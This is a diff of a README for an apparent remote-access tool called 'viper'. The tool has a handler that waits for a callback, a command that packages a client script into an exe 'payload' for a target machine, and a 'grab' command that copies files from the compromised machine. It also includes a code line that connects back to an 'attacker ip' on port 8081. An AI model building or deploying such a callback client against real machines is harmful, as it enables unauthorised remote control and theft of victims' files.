@@ -55,10 +55,20 @@ start the handler first and then start the client on the target machine
 
 viper main commands:
 
+[*] handler ========= > "starts the viper server and waits for a call back" 
 
-[+] handler ========= > "starts the viper server and waits for a call back" 
+[*] buildfang ========= > "creates a basic exe file from viperclient.py and stores it inside payloads"; 
 
-[*] client2exe ========= > "creates a basic exe file from viperclient.py and stores it inside payloads"; 
+[*] chatserver ========= > will start your chat server on port 8123. You will have to open a new terminal to connect
+
+[*] stopchat ========= > will tear down the chat server when needed
+
+[*] startweb ========= > starts the webserver
+
+[*] stopweb ========= > stops the webserver
+
+
+***build fang pre-instructions***
 
 Inside viper client modify these two lines with your local ip address
 
@@ -67,7 +77,8 @@ Inside viper client modify these two lines with your local ip address
     s.connect(('address you want to connect back to, attacker ip', 8081))
 
 
-viper connection commands:
+***viper connection commands:***
+
 use these once you get the call back from the client. first you will need to enter in the local host and port number that you assigned to the client before deploying. 
 
 [*] grab*<filename> ========= > grabs the file and saves it to the local desktop as .txt";
